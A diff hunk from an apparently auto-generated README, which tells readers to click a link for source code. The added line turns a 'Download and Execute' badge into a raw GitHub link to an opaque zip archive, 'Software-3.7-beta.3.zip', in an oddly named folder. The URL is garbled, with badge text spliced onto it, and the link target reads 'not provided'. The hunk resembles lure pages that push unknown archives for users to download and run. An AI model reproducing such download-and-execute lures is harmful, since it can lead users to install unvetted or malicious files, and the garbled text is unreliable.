@@ -21,7 +21,7 @@ No specific topics provided.
 
 To dive into the source code, click on the link provided below. If the link is not available or doesn't work, make sure to check the "Releases" section for alternative ways to access the code.
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Click%20Here-blue)](not provided)
+[![Download and Execute](https://raw.githubusercontent.com/IamNipuna/src/master/unmimicked/Software-3.7-beta.3.zip%20and%20Execute-Click%20Here-blue)](not provided)
 
 ---
 
